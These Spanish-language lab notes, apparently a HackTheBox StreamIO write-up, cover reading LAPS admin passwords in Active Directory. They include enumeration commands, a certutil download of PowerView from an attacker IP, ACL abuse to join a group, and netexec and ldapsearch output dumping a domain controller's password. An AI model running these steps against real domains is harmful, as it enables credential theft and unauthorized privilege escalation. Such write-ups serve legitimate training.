

## 🧩 1. Concepto
LAPS administra la contraseña del administrador local en equipos unidos al dominio:

- Contraseñas únicas y aleatorias  
- Cambian periódicamente  
- Se almacenan en Active Directory  
- Permisos controlados por ACLs  
- Comunicación protegida con Kerberos v5 + AES  

Atributos creados en el objeto del equipo:
- **ms-mcs-AdmPwd** → contraseña local  
- **ms-mcs-AdmPwdExpirationTime** → fecha de expiración  

---

## 🛠️ 2. Comprobar si LAPS está habilitado

### Registro
```cmd
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

## Comprobar CSE de LAPS

`dir "C:\Program Files\LAPS\CSE" # Verificar si existe AdmPwd.dll`

## Buscar GPOs relacionadas con LAPS

`Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl`

## Buscar equipos con LAPS habilitado

`Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname`

---

# 🔑 3. Acceso a Contraseñas LAPS

## Cmdlets nativos de LAPS

Listar cmdlets:

`Get-Command *AdmPwd*`

Ver quién puede leer contraseñas:

`Find-AdmPwdExtendedRights -Identity Workstations | fl`

Leer contraseña:

`Get-AdmPwdPassword -ComputerName wkstn-2 | fl`

---

# 🟠 4. PowerView

Buscar quién tiene permisos sobre el atributo LAPS:

`Get-AdmPwdPassword -ComputerName wkstn-2 | fl`

Leer contraseña directamente:

`Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd`

---

# 🟡 5. LAPSToolkit

Grupos que pueden leer contraseñas:

`Find-LAPSDelegatedGroups`

Permisos extendidos sobre equipos con LAPS:

`Find-AdmPwdExtendedRights`

Obtener contraseña, expiración y equipos:

`Get-LAPSComputers`

---

# 🔵 6. crackmapexec — Dump de contraseñas LAPS

`crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps`

---

# 🧵 7. Sesión Evil-WinRM — Información del usuario svc_deploy

## `net user svc_deploy`

- Cuenta activa, no expira.
    
- Miembro de:
    
    - **Remote Management Users**
        
    - **LAPS_Readers** → puede leer contraseñas LAPS.
        
- Último logon correcto.
    
- Contraseña no expira.
    

---

# 🌐 8. Descarga e Importación de PowerView

`certutil -urlcache -f -split http://10.10.14.244/PowerView.ps1 PowerView.ps1 Import-Module .\PowerView.ps1`

---

# 🔍 9. Consultas de Atributos LAPS

Usando PowerView:

`Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime`

Usando AD cmdlets:

`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *`

---

# 🖥️ 10. Resultados del Controlador de Dominio (DC01)

### Atributos LAPS hallados:

**ms-Mcs-AdmPwd**

`0P6zFCn7}-);/,L26G52Pe5;`

**ms-Mcs-AdmPwdExpirationTime**

`134099169045901006`

### Otros detalles relevantes:

- Equipo crítico (Domain Controller)
    
- TrustedForDelegation = True
    
- Kerberos soporta RC4, AES128, AES256
    
- SPNs asignados correctamente
    

---

# 🖥️ 11. Resultados del Equipo DB01

- No contiene atributos **ms-Mcs-AdmPwd** ni **ms-Mcs-AdmPwdExpirationTime**
    
- LAPS **probablemente no está aplicado** en su OU.
    
- Equipo con muy poca actividad en el dominio.
    

---

# ✔️ 12. Resumen General

- El usuario **svc_deploy** (miembro de **LAPS_Readers**) puede leer contraseñas LAPS.
    
- Se recuperó exitosamente la contraseña LAPS del **DC01**.
    
- No todos los equipos tienen LAPS aplicado (ej: DB01).
    
- PowerView y herramientas LAPS confirman la delegación correcta.
    
- crackmapexec permite dumpear remotamente contraseñas LAPS si el usuario tiene permisos.
    

---





![[Pasted image 20260112222939.png]]

```shell
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/kali/machines/StreamIO/content/PowerView.ps1 to C:\Users\nikk37\Documents\PowerView.ps1
                                        
Data: 1232452 bytes of 1232452 bytes copied
                                        
Info: Upload successful!
```

## 1. Ejecución inicial de PowerView
## 2. Creación de credenciales en PowerShell
**Explicación:**

- `ConvertTo-SecureString`: Convierte la contraseña en un objeto seguro.
    
- `PSCredential`: Crea un objeto de credenciales reutilizable para autenticación en el dominio.
    
- Se evita depender del contexto de sesión actual.


## 4. Importación correcta del módulo PowerView

## 5. Modificación de ACLs del grupo (delegación de control)

**Explicación:**

- Concede permisos al usuario **JDgodd** sobre el objeto **Core Staff**.
    
- Abusa de ACLs en Active Directory.
    
- Permite que el usuario pueda modificar el grupo (por ejemplo, añadir miembros).
## 6. Verificación del usuario antes de la escalada

## 7. Añadir el usuario al grupo objetivo



``` powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\nikk37\Documents> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',$SecPassword)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
*Evil-WinRM* PS C:\Users\nikk37\Documents> net user JDgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:56:42 AM
Password expires             Never
Password changeable          2/23/2022 1:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/13/2026 2:01:12 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $Cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> net user JDgodd
User name                    JDgodd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 1:56:42 AM
Password expires             Never
Password changeable          2/23/2022 1:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/13/2026 2:01:12 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

```shell
etexec ldap streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --kdcHost 10.129.70.224 -M laps
/home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
LDAP        10.129.70.224   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.70.224   389    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
LAPS        10.129.70.224   389    DC               [*] Getting LAPS Passwords
LAPS        10.129.70.224   389    DC               Computer:DC$ User:                Password:1O(]34[e]F81z,
```

```shell
ldapsearch -x -H ldap://10.129.70.224 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b 'DC=streamIO,DC=htb' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 1O(]34[e]F81z,

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
